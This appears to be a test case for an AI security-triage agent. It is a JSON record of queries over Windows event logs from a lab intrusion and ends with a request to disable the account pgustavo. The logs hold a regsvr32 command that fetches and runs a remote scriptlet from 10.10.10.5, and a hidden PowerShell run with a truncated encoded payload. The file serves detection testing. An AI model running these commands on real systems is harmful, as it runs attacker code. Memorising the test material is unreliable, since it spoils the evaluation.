@@ -1,0 +1,56 @@
+{
+  "case_id": "test-15:R_pos",
+  "profile": "Profile of window SDWIN-200721232741: 2390 events. Request: pgustavo's elevated PowerShell on WORKSTATION5 used regsvr32 to fetch and run a remote scriptlet that started a new beaconing PowerShell. Disable account pgustavo. Target: {\"account\": \"pgustavo\"}.",
+  "queries": [
+    {
+      "sql": "SELECT * FROM process_create WHERE record_id IN (219, 224, 240, 283) ORDER BY record_id",
+      "result": "<<UNTRUSTED_LOG_DATA>>\n{\"record_id\": 219, \"ts\": \"2020-07-22T03:27:53.590000\", \"host\": \"WORKSTATION5.mordor.local\", \"channel\": \"Security\", \"event_id\": 4688, \"image\": \"C:\\\\Windows\\\\System32\\\\regsvr32.exe\", \"command_line\": \"\\\"C:\\\\windows\\\\system32\\\\regsvr32.exe\\\" /s /n /u /i:http://10.10.10.5:8444/launcher.sct scrobj.dll\", \"parent_image\": \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\", \"parent_command_line\": null, \"pid\": 9384, \"ppid\": 8648, \"user\": \"pgustavo\", \"integrity_level\": \"High\", \"hashes\": null}\n{\"record_id\": 224, \"ts\": \"2020-07-22T03:27:54.604000\", \"host\": \"WORKSTATION5.mordor.local\", \"channel\": \"Microsoft-Windows-Sysmon/Operational\", \"event_id\": 1, \"image\": \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\", \"command_line\": \"\\\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\\\" -noP -sta -w 1 -enc  SQBGACgAJABQAFMAVgBFAHIAcwBJAG8ATgBUAGEAQgBMAGUALgBQAFMAVgBFAFIAUwBJAE8AbgAuAE0AQQBKAG8AUgAgAC0ARwBlACAAMwApAHsAJAA1ADc…[cut: 5213 chars]\", \"parent_image\": \"C:\\\\Windows\\\\System32\\\\regsvr32.exe\", \"parent_command_line\": \"\\\"C:\\\\windows\\\\system32\\\\regsvr32.exe\\\" /s /n /u /i:http://10.10.10.5:8444/launcher.sct scrobj.dll\", \"pid\": 9076, \"ppid\": 9384, \"user\": \"pgustavo\", \"integrity_level\": \"High\", \"hashes\": \"SHA1=36C5D12033B2EAF251BAE61C00690FFB17FDDC87,MD5=CDA48FC75952AD12D99E526D0B6BF70A,SHA256=908B64B1971A979C7E3E8CE4621945CBA84854CB98D76367B791A6E22B5F6D53,IMPHASH=A7CEFACDDA74B13CD330390769752481\"}\n{\"record_id\": 240, \"ts\": \"2020-07-22T03:27:54.609000\", \"host\": \"WORKSTATION5.mordor.local\", \"channel\": \"Microsoft-Windows-Sysmon/Operational\", \"event_id\": 1, \"image\": \"C:\\\\Windows\\\\System32\\\\conhost.exe\", \"command_line\": \"\\\\??\\\\C:\\\\windows\\\\system32\\\\conhost.exe 0xffffffff -ForceV1\", \"parent_image\": \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\", \"parent_command_line\": \"\\\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\\\" -noP -sta -w 1 -enc  SQBGACgAJABQAFMAVgBFAHIAcwBJAG8ATgBUAGEAQgBMAGUALgBQAFMAVgBFAFIAUwBJAE8AbgAuAE0AQQBKAG8AUgAgAC0ARwBlACAAMwApAHsAJAA1ADc…[cut: 5213 chars]\", \"pid\": 4856, \"ppid\": 9076, \"user\": \"pgustavo\", \"integrity_level\": \"High\", \"hashes\": \"SHA1=11996F32DD85863A8C3BFF6D520F788A9211C8F7,MD5=C5E9B1D1103EDCEA2E408E9497A5A88F,SHA256=BAF97B2A629723947539CFF84E896CD29565AB4BB68B0CEC515EB5C5D6637B69,IMPHASH=F8DD0EF565DE87D97ABF9C62EA63EC21\"}\n{\"record_id\": 283, \"ts\": \"2020-07-22T03:27:54.620000\", \"host\": \"WORKSTATION5.mordor.local\", \"channel\": \"Security\", \"event_id\": 4688, \"image\": \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\", \"command_line\": \"\\\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\\\" -noP -sta -w 1 -enc  SQBGACgAJABQAFMAVgBFAHIAcwBJAG8ATgBUAGEAQgBMAGUALgBQAFMAVgBFAFIAUwBJAE8AbgAuAE0AQQBKAG8AUgAgAC0ARwBlACAAMwApAHsAJAA1ADc…[cut: 5213 chars]\", \"parent_image\": \"C:\\\\Windows\\\\System32\\\\regsvr32.exe\", \"parent_command_line\": null, \"pid\": 9076, \"ppid\": 9384, \"user\": \"pgustavo\", \"integrity_level\": \"High\", \"hashes\": null}\n<</UNTRUSTED_LOG_DATA>>",
+      "rows": 4,
+      "registered": [
+        219,
+        224,
+        240,
+        283
+      ]
+    },
+    {
+      "sql": "SELECT * FROM process_access WHERE record_id IN (98, 144, 166, 167, 226) ORDER BY record_id",
+      "result": "<<UNTRUSTED_LOG_DATA>>\n{\"record_id\": 98, \"ts\": \"2020-07-22T03:27:53.548000\", \"host\": \"WORKSTATION5.mordor.local\", \"channel\": \"Microsoft-Windows-Sysmon/Operational\", \"event_id\": 10, \"source_image\": \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\", \"source_pid\": 8648, \"target_image\": \"C:\\\\windows\\\\system32\\\\regsvr32.exe\", \"target_pid\": 9384, \"granted_access\": \"0x1fffff\", \"call_trace\": \"C:\\\\windows\\\\SYSTEM32\\\\ntdll.dll+9d8e4|C:\\\\windows\\\\System32\\\\KERNELBASE.dll+5f36a|C:\\\\windows\\\\System32\\\\KERNELBASE.dll+5bd06|C:\\\\windows\\\\System32\\\\KERNEL32.DLL+1be93|C:\\\\windows\\\\assembly\\\\NativeImages_v4.0.30319…[cut: 1271 chars]\", \"user\": null}\n{\"record_id\": 144, \"ts\": \"2020-07-22T03:27:53.565000\", \"host\": \"WORKSTATION5.mordor.local\", \"channel\": \"Microsoft-Windows-Sysmon/Operational\", \"event_id\": 10, \"source_image\": \"C:\\\\windows\\\\system32\\\\lsass.exe\", \"source_pid\": 740, \"target_image\": \"C:\\\\windows\\\\system32\\\\regsvr32.exe\", \"target_pid\": 9384, \"granted_access\": \"0x1478\", \"call_trace\": \"C:\\\\windows\\\\SYSTEM32\\\\ntdll.dll+9c534|C:\\\\windows\\\\system32\\\\lsasrv.dll+1792a|C:\\\\windows\\\\system32\\\\lsasrv.dll+184bf|C:\\\\windows\\\\system32\\\\lsasrv.dll+17783|C:\\\\windows\\\\SYSTEM32\\\\SspiSrv.dll+1a72|C:\\\\windows\\\\Syste…[cut: 737 chars]\", \"user\": null}\n{\"record_id\": 166, \"ts\": \"2020-07-22T03:27:53.571000\", \"host\": \"WORKSTATION5.mordor.local\", \"channel\": \"Microsoft-Windows-Sysmon/Operational\", \"event_id\": 10, \"source_image\": \"C:\\\\windows\\\\system32\\\\svchost.exe\", \"source_pid\": 920, \"target_image\": \"C:\\\\windows\\\\System32\\\\svchost.exe\", \"target_pid\": 5148, \"granted_access\": \"0x1000\", \"call_trace\": \"C:\\\\windows\\\\SYSTEM32\\\\ntdll.dll+9c534|C:\\\\windows\\\\SYSTEM32\\\\psmserviceexthost.dll+222a3|C:\\\\windows\\\\SYSTEM32\\\\psmserviceexthost.dll+1a172|C:\\\\windows\\\\SYSTEM32\\\\psmserviceexthost.dll+19e3b|C:\\\\windows\\\\SYSTEM32\\\\…[cut: 374 chars]\", \"user\": null}\n{\"record_id\": 167, \"ts\": \"2020-07-22T03:27:53.572000\", \"host\": \"WORKSTATION5.mordor.local\", \"channel\": \"Microsoft-Windows-Sysmon/Operational\", \"event_id\": 10, \"source_image\": \"C:\\\\windows\\\\system32\\\\svchost.exe\", \"source_pid\": 920, \"target_image\": \"C:\\\\windows\\\\System32\\\\svchost.exe\", \"target_pid\": 5148, \"granted_access\": \"0x1000\", \"call_trace\": \"C:\\\\windows\\\\SYSTEM32\\\\ntdll.dll+9c534|C:\\\\windows\\\\SYSTEM32\\\\psmserviceexthost.dll+222a3|C:\\\\windows\\\\SYSTEM32\\\\psmserviceexthost.dll+1a172|C:\\\\windows\\\\SYSTEM32\\\\psmserviceexthost.dll+19e3b|C:\\\\windows\\\\SYSTEM32\\\\…[cut: 374 chars]\", \"user\": null}\n{\"record_id\": 226, \"ts\": \"2020-07-22T03:27:54.605000\", \"host\": \"WORKSTATION5.mordor.local\", \"channel\": \"Microsoft-Windows-Sysmon/Operational\", \"event_id\": 10, \"source_image\": \"C:\\\\windows\\\\system32\\\\regsvr32.exe\", \"source_pid\": 9384, \"target_image\": \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\", \"target_pid\": 9076, \"granted_access\": \"0x1fffff\", \"call_trace\": \"C:\\\\windows\\\\SYSTEM32\\\\ntdll.dll+9d8e4|C:\\\\windows\\\\System32\\\\KERNELBASE.dll+5f36a|C:\\\\windows\\\\System32\\\\KERNELBASE.dll+5bd06|C:\\\\windows\\\\System32\\\\KERNEL32.DLL+1be93|C:\\\\windows\\\\System32\\\\windows.storage.dll+c96…[cut: 750 chars]\", \"user\": null}\n<</UNTRUSTED_LOG_DATA>>",
+      "rows": 5,
+      "registered": [
+        98,
+        144,
+        166,
+        167,
+        226
+      ]
+    },
+    {
+      "sql": "SELECT * FROM network WHERE record_id IN (999, 1000, 1001, 1005) ORDER BY record_id",
+      "result": "<<UNTRUSTED_LOG_DATA>>\n{\"record_id\": 999, \"ts\": \"2020-07-22T03:27:55.954000\", \"host\": \"WORKSTATION5.mordor.local\", \"channel\": \"Microsoft-Windows-Sysmon/Operational\", \"event_id\": 3, \"image\": \"C:\\\\Windows\\\\System32\\\\svchost.exe\", \"pid\": 5148, \"src_ip\": \"172.18.39.5\", \"src_port\": 50245, \"dst_ip\": \"172.18.38.6\", \"dst_port\": 5985, \"protocol\": \"tcp\", \"direction\": \"outbound\", \"user\": \"network service\"}\n{\"record_id\": 1000, \"ts\": \"2020-07-22T03:27:55.955000\", \"host\": \"WORKSTATION5.mordor.local\", \"channel\": \"Microsoft-Windows-Sysmon/Operational\", \"event_id\": 3, \"image\": \"C:\\\\Windows\\\\System32\\\\svchost.exe\", \"pid\": 5148, \"src_ip\": \"172.18.39.5\", \"src_port\": 50246, \"dst_ip\": \"172.18.38.6\", \"dst_port\": 5985, \"protocol\": \"tcp\", \"direction\": \"outbound\", \"user\": \"network service\"}\n{\"record_id\": 1001, \"ts\": \"2020-07-22T03:27:55.955000\", \"host\": \"WORKSTATION5.mordor.local\", \"channel\": \"Microsoft-Windows-Sysmon/Operational\", \"event_id\": 3, \"image\": \"C:\\\\Windows\\\\System32\\\\regsvr32.exe\", \"pid\": 9384, \"src_ip\": \"172.18.39.5\", \"src_port\": 50247, \"dst_ip\": \"10.10.10.5\", \"dst_port\": 8444, \"protocol\": \"tcp\", \"direction\": \"outbound\", \"user\": \"pgustavo\"}\n{\"record_id\": 1005, \"ts\": \"2020-07-22T03:27:55.956000\", \"host\": \"MORDORDC.mordor.local\", \"channel\": \"Security\", \"event_id\": 5156, \"image\": \"\\\\device\\\\harddiskvolume4\\\\windows\\\\system32\\\\lsass.exe\", \"pid\": 704, \"src_ip\": \"172.18.38.6\", \"src_port\": 62654, \"dst_ip\": \"172.18.38.5\", \"dst_port\": 389, \"protocol\": \"17\", \"direction\": \"inbound\", \"user\": null}\n<</UNTRUSTED_LOG_DATA>>",
+      "rows": 4,
+      "registered": [
+        999,
+        1000,
+        1001,
+        1005
+      ]
+    }
+  ],
+  "findings": "Records 98, 219, 226, 1001 look relevant to the request; deciding on the next action.",
+  "retrieved": [
+    98,
+    144,
+    166,
+    167,
+    219,
+    224,
+    226,
+    240,
+    283,
+    999,
+    1000,
+    1001,
+    1005
+  ]
+}
